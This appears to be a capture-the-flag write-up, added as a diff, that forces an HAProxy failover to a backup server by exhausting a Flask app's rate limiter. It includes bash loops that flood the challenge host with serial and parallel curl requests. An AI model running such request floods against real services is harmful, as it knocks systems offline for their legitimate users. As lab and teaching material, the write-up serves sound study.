@@ -1,0 +1,130 @@
+Challenge Overview
+
+This challenge presents a high-availability system with:
+
+    HAProxy load balancer (configuration provided)
+
+    Two backend servers: primary (port 8000) and backup (port 9000)
+
+    Flask application with global rate limiting (300 requests/minute)
+
+    Flag only visible when IS_BACKUP="yes" environment variable is set
+
+Step 1: Analyze the Configuration Files
+haproxy.cfg Analysis
+bash
+
+cat haproxy.cfg
+
+Key findings:
+
+    Primary server: s1 *:8000 (main target)
+
+    Backup server: s2 *:9000 (marked with backup flag)
+
+    Health checks every 2 seconds (inter 2s)
+
+    Server marked DOWN after 2 failed checks (fall 2)
+
+    Server marked UP after 3 successful checks (rise 3)
+
+app.py Analysis
+bash
+
+cat app.py
+
+Key findings:
+
+    Flag only shown when os.getenv("IS_BACKUP") == "yes"
+
+    Global rate limiter: 300 requests per minute
+
+    Rate limit exceeded returns 503 Service Unavailable
+
+Step 2: Understand the Attack Vector
+
+The load balancer only sends traffic to backup if primary is DOWN. To force failover:
+
+    Trigger rate limiter on primary (cause 503 errors)
+
+    HAProxy health checks see 503s and mark primary DOWN
+
+    Traffic redirects to backup server
+
+    Backup server shows the flag
+
+Step 3: Initial Reconnaissance
+
+Check the challenge website:
+bash
+
+curl http://mysterious-sea.picoctf.net:65138/
+
+Response shows: "No flag in this service" (confirming we're on primary)
+Step 4: Launch Attack - Take Down Primary Server
+Terminal 1: Constant Pressure
+bash
+
+# Hammer the server continuously to trigger rate limit
+while true; do
+    curl -s http://mysterious-sea.picoctf.net:65138/ > /dev/null
+    echo -n "."
+done
+
+Alternative: More Aggressive Attack
+bash
+
+# Parallel requests for faster rate limit trigger
+while true; do
+    for i in {1..50}; do
+        curl -s http://mysterious-sea.picoctf.net:65138/ > /dev/null &
+    done
+    sleep 1
+done
+
+Step 5: Monitor for Failover
+Terminal 2: Watch for Flag
+bash
+
+# Monitor for flag appearance
+while true; do
+    clear
+    echo "🔍 Checking for flag... (Press Ctrl+C to stop)"
+    echo "--- $(date) ---"
+    
+    RESPONSE=$(curl -s http://mysterious-sea.picoctf.net:65138/)
+    
+    if [[ $RESPONSE != *"No flag in this service"* ]] && [[ $RESPONSE != *"503"* ]] && [[ $RESPONSE != *"Rate limit"* ]]; then
+        echo "🎉🎉🎉 FLAG FOUND! 🎉🎉🎉"
+        echo "$RESPONSE" | grep -o 'picoCTF{.*}'
+        break
+    else
+        echo "⏳ Waiting for failover..."
+    fi
+    sleep 2
+done
+
+Step 6: Observe Attack Progress
+
+    Initial phase: Terminal 1 shows dots (successful requests to primary)
+
+    Rate limit triggered: After ~300 requests, primary starts returning 503
+
+    HAProxy detection: Takes 4-6 seconds (2 health check cycles) to mark primary DOWN
+
+    Failover window: Traffic switches to backup server
+
+    Flag appears: Terminal 2 shows flag (may be brief)
+
+Step 7: Handle Rate Limit on Backup
+
+If both servers become rate-limited (global limiter):
+bash
+
+# Wait 60 seconds for rate limit to reset
+sleep 60
+
+# Check for flag
+curl http://mysterious-sea.picoctf.net:65138/
+
+Step 8: Capture the Flag
